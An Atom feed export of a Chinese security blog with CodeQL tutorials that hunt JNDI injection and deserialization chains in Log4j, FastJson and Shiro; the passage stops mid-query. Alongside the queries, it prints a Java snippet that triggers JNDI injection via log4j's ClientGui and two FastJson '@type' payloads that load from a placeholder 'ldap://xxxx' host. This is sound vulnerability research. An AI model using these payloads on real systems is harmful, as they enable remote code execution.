<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.sari3l.com/"/>
  <updated>2021-12-30T06:48:58.292Z</updated>
  <id>https://blog.sari3l.com/</id>
  
  <author>
    <name>Sariel.D</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CodeQL 学习小记 Log4j</title>
    <link href="https://blog.sari3l.com/posts/b6c4d907/"/>
    <id>https://blog.sari3l.com/posts/b6c4d907/</id>
    <published>2021-12-30T06:32:20.000Z</published>
    <updated>2021-12-30T06:48:58.292Z</updated>
    
    <content type="html"><![CDATA[<h2 id="QL"><a href="#QL" class="headerlink" title="QL"></a>QL</h2><p>这里可以借鉴 CWE-074 中的内容，直接使用其定义的 sink，其已经将常见的利用点标记出来</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">DefaultJndiInjectionSinkModel</span> <span class="token keyword">extends</span> <span class="token class-name">SinkModelCsv</span> <span class="token punctuation">{</span>  override predicate <span class="token function">row</span><span class="token punctuation">(</span>string row<span class="token punctuation">)</span> <span class="token punctuation">{</span>    row <span class="token operator">=</span>      <span class="token punctuation">[</span>        <span class="token string">"javax.naming;Context;true;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;lookupLink;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;rename;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;list;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;Context;true;listBindings;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.naming;InitialContext;true;doLookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.management.remote;JMXConnector;true;connect;;;Argument[-1];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"javax.management.remote;JMXConnectorFactory;false;connect;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// Spring</span>        <span class="token string">"org.springframework.jndi;JndiTemplate;false;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// spring-ldap 1.2.x and newer</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;lookupContext;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;findByDn;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;rename;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;list;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;listBindings;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(Name,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(Name,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(String,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;search;(String,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;searchForObject;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap.core;LdapOperations;true;searchForObject;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// spring-ldap 1.1.x</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;lookup;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;lookupContext;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;findByDn;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;rename;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;list;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;listBindings;;;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(Name,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(Name,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(String,String,int,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;search;(String,String,int,String[],ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;searchForObject;(Name,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token string">"org.springframework.ldap;LdapOperations;true;searchForObject;(String,String,ContextMapper);;Argument[0];jndi-injection"</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// Shiro</span>        <span class="token string">"org.apache.shiro.jndi;JndiTemplate;false;lookup;;;Argument[0];jndi-injection"</span>      <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>所以我们只要关注到 source 的定义即可，而追溯 source 不管怎么向上，终归应该是有个函数中的某个参数是源头，所以如下定义 source</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>JndiInjection<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>PathGraph<span class="token keyword">class</span> <span class="token class-name">Config</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>    <span class="token function">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"Config"</span> <span class="token punctuation">}</span>    override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node source<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>Argument a <span class="token operator">|</span> a <span class="token operator">=</span> source<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node sink<span class="token punctuation">)</span> <span class="token punctuation">{</span> sink <span class="token keyword">instanceof</span> <span class="token class-name">JndiInjectionSink</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>from DataFlow<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow<span class="token operator">:</span><span class="token operator">:</span>PathNode sink<span class="token punctuation">,</span> Config confwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select sink<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"JNDI lookup might include name from $@."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this user input"</span></code></pre><p>这个结果太多以至于就不放上来占篇幅了，不过有很多有意思的东西可以自己看看</p><h2 id="限定-AbstractLogger"><a href="#限定-AbstractLogger" class="headerlink" title="限定 AbstractLogger"></a>限定 AbstractLogger</h2><p>限定为AbstractLogger的主要考虑是为了重现 CVE-2021-44228，由于此类下方法太多，没必要过于细化，我们只要考虑这个类里，某个公开函数的某个参数应是 source 即可</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node source<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess mda <span class="token operator">|</span>        mda<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.spi"</span><span class="token punctuation">,</span> <span class="token string">"AbstractLogger"</span><span class="token punctuation">)</span> and        mda<span class="token punctuation">.</span><span class="token function">getAnArgument</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> source<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> and        mda<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isPublic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>基本有的没的就全出来了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/b6c4d907/16408456562983.jpg" alt></p><h2 id="关于-DataSourceConnectionSource"><a href="#关于-DataSourceConnectionSource" class="headerlink" title="关于 DataSourceConnectionSource"></a>关于 DataSourceConnectionSource</h2><p>这个发现不用什么高大上的方法，甚至根本不该称为漏洞（很模糊的界限），注释里面写的就是对 JNDI 形式的支持（我觉得官方现在是草木皆兵</p><p>只需要对上述的 isSink 使用<code>CodeQL: Quick Evaluation</code>快速查询即可</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/b6c4d907/16408446083777.jpg" alt></p><p>如果上面的都能称为漏洞，那么如<code>org.apache.logging.log4j.jmx.gui#main</code>里也明显有 JNDI 注入，只是需要传输指定类名为 jmxrmi</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/b6c4d907/16408446887099.jpg" alt></p><p>直接利用</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>jmx<span class="token punctuation">.</span>gui<span class="token punctuation">.</span>ClientGui<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.rmi.object.trustURLCodebase"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ClientGui<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><br><br><p align="center">终归就是  <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/b6c4d907/no-no-please.gif" width="30%" height="30%"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;再水一篇 CodeQL&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="CodeQL" scheme="https://blog.sari3l.com/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 学习小记</title>
    <link href="https://blog.sari3l.com/posts/91764dea/"/>
    <id>https://blog.sari3l.com/posts/91764dea/</id>
    <published>2021-12-27T13:23:51.000Z</published>
    <updated>2021-12-30T06:33:02.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="FastJson-JNDI-分析"><a href="#FastJson-JNDI-分析" class="headerlink" title="FastJson JNDI 分析"></a>FastJson JNDI 分析</h2><h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>首先，我们先要明确现在是已知漏洞点和步入条件，由此来尝试获取其他未知的链</p><pre class=" language-plain"><code class="language-plain">比如需要满足以下条件的setter- 函数名长度 >= 4- 非静态函数- 返回类型要么是void要么是当前类- 参数只有一个- 方法名需要以set开头----满足以下条件的getter- 函数名长度 >= 4- 非静态函数- 函数名称以get起始，且第四个字符为大写字母- 函数没有入参- 继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</code></pre><p>首先编译好数据库，然后开始着手 QL 查询文件</p><h3 id="QL"><a href="#QL" class="headerlink" title="QL"></a>QL</h3><h4 id="I-定义-JNDI-相关方法"><a href="#I-定义-JNDI-相关方法" class="headerlink" title="I. 定义 JNDI 相关方法"></a>I. 定义 JNDI 相关方法</h4><p>第一步，由于我们目标 sink 是 JNDI 相关类下的 lookup 方法，所以先定义目标方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">JNDIMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">JNDIMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>来解释下各行的内容，之后的学习就不再赘述</p><ul><li>Line 1: 首先自定义的类要继承 Codeql 提供的 <a href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Method.html" target="_blank" rel="noopener">Method 类</a>，用于遴选出我们想要的方法</li><li>Line 3、4: 这两行的作用即满足这些<code>限制条件</code>，那么<code>this</code>应是我们想要的方法</li></ul><p>其中，对限制条件中用到的函数做一些解释</p><ul><li>Member::getDeclaringType -&gt; RefType 获取定义当前方法的类</li><li>RefType::getAnAncestor -&gt; RefType 获取当前类的直接或间接父类，包括其自身</li><li>Member::hasQualifiedName -&gt; predicate 判断此类是否在指定 package 中以指定 name 声明</li></ul><p>所以整个限制条件直接翻译就是：寻找名为 lookup 的方法所在类，且此类应在javax.naming中被声明为Context类，即查找 <code>javax.naming.Context#lookup</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">JNDIMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">JNDIMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="II-设定-全局-污点跟踪"><a href="#II-设定-全局-污点跟踪" class="headerlink" title="II. 设定(全局)污点跟踪"></a>II. 设定(全局)污点跟踪</h3><h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><p>函数解释</p><ul><li>FieldAccesses::getSite -&gt; Callable 获取当前字段所在表达式的直接封闭可调用对象（细品</li><li>Element::getName -&gt; string 获取当前元素的命名</li></ul><p>isSource 检测是否存在某个对字段的访问的表达式，是在名为 getXXX 或 setXXX 的函数中，是的话则将此<code>字段入口</code>设置为搜寻的 source（起点）</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>FieldAccess fac <span class="token operator">|</span> <span class="token punctuation">(</span>            fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span> or            fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>        <span class="token punctuation">)</span> and node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> fac    <span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="Sink"><a href="#Sink" class="headerlink" title="Sink"></a>Sink</h4><p>函数解释</p><ul><li>MethodAccess::getMethod -&gt; Method 返回当前方法入口的方法（绕口 </li></ul><p>isSink 检测是否存在某个方法是 JNDIMethod 的实例，且第一个参数可控，是的话将此<code>方法入口</code>设置为搜寻的 sink（终点）</p><pre class=" language-java"><code class="language-java">override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess md <span class="token operator">|</span> <span class="token punctuation">(</span>            md<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">JNDIMethod</span> and            node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> md<span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h3 id="III-执行搜索"><a href="#III-执行搜索" class="headerlink" title="III. 执行搜索"></a>III. 执行搜索</h3><p>说实话看官方文档没太看懂 DataFlow DataFlow2 有啥区别</p><ul><li>Configuration::hasFlowPath -&gt; predicate 获取满足从 source 流向 sink 的数据</li></ul><pre class=" language-java"><code class="language-java">from MyTaintTraking conf<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode sinkwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h4 id="Metadata-设置"><a href="#Metadata-设置" class="headerlink" title="Metadata 设置"></a>Metadata 设置</h4><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>TaintTracking2<span class="token keyword">import</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathGraph<span class="token keyword">class</span> <span class="token class-name">JNDIMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">JNDIMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"javax.naming"</span><span class="token punctuation">,</span> <span class="token string">"Context"</span><span class="token punctuation">)</span> and        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hasName</span><span class="token punctuation">(</span><span class="token string">"lookup"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">MyTaintTraking</span> <span class="token keyword">extends</span> <span class="token class-name">TaintTracking2</span><span class="token operator">:</span><span class="token operator">:</span>Configuration <span class="token punctuation">{</span>    <span class="token function">MyTaintTraking</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span> <span class="token operator">=</span> <span class="token string">"MyTaintTraking"</span> <span class="token punctuation">}</span>    override predicate <span class="token function">isSource</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>FieldAccess fac <span class="token operator">|</span> <span class="token punctuation">(</span>                fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span> or                fac<span class="token punctuation">.</span><span class="token function">getSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span>            <span class="token punctuation">)</span> and node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> fac        <span class="token punctuation">)</span>    <span class="token punctuation">}</span>    override predicate <span class="token function">isSink</span><span class="token punctuation">(</span>DataFlow<span class="token operator">:</span><span class="token operator">:</span>Node node<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">exists</span><span class="token punctuation">(</span>MethodAccess md <span class="token operator">|</span> <span class="token punctuation">(</span>                md<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">JNDIMethod</span> and                node<span class="token punctuation">.</span><span class="token function">asExpr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> md<span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>from MyTaintTraking conf<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode source<span class="token punctuation">,</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathNode sinkwhere conf<span class="token punctuation">.</span><span class="token function">hasFlowPath</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> sink<span class="token punctuation">)</span>select sink<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> source<span class="token punctuation">,</span> sink<span class="token punctuation">,</span> <span class="token string">"JNDI lookup might include name from $@."</span><span class="token punctuation">,</span> source<span class="token punctuation">.</span><span class="token function">getNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"this user input"</span></code></pre><h3 id="IV-分析结果"><a href="#IV-分析结果" class="headerlink" title="IV. 分析结果"></a>IV. 分析结果</h3><p>最后成功执行会有 alerts 信息，本次有三条，但实际是两条链，中间因为有<code>if...else...</code>结构导致 Path 看起来多，结果中的 Path 从上到下即是从 source 到 sink 的过程</p><h4 id="JndiObjectFactory"><a href="#JndiObjectFactory" class="headerlink" title="JndiObjectFactory"></a>JndiObjectFactory</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91764dea/16403289987343.jpg" alt></p><p>对应 Payload</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.shiro.jndi.JndiObjectFactory"</span><span class="token punctuation">,</span>    <span class="token property">"resourceName"</span><span class="token operator">:</span> <span class="token string">"ldap://xxxx"</span><span class="token punctuation">}</span></code></pre><h4 id="JndiRealmFactory"><a href="#JndiRealmFactory" class="headerlink" title="JndiRealmFactory"></a>JndiRealmFactory</h4><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91764dea/16403290786878.jpg" alt></p><p>对应 Payload</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.shiro.realm.jndi.JndiRealmFactory"</span><span class="token punctuation">,</span>    <span class="token property">"jndiNames"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"ldap://xxxx"</span>    <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h2 id="Shiro-Deserialize-分析"><a href="#Shiro-Deserialize-分析" class="headerlink" title="Shiro Deserialize 分析"></a>Shiro Deserialize 分析</h2><p>我们知道序列化的终点是<code>java.io.ObjectInputStream#readObject</code>即可以作为 sink，那么关键点在于如何设定 source</p><h3 id="QL-1"><a href="#QL-1" class="headerlink" title="QL"></a>QL</h3><p>首先我们确定肯定是从某个字段最终流向反序列化执行，所以这里 source 设置为所有字段</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * @kind path-problem */</span><span class="token keyword">import</span> java<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>TaintTracking2<span class="token keyword">import</span> semmle<span class="token punctuation">.</span>code<span class="token punctuation">.</span>java<span class="token punctuation">.</span>dataflow<span class="token punctuation">.</span>FlowSources<span class="token keyword">import</span> DataFlow2<span class="token operator">:</span><span class="token operator">:</span>PathGraph<span class="token keyword">class</span> <span class="token class-name">DeseializationMethod</span> <span class="token keyword">extends</span> <span class="token class-name">Method</span> <span class="token punctuation">{</span>    <span class="token function">DeseializationMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDeclaringType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasQualifiedName</span><span class="token punctuation">(</span><span class="token string">"java.io"</span><span class="token punctuation">,</span> <span class="token string">"ObjectInputStream"</span><span class="token punctuation">)</span> and        <span class="token 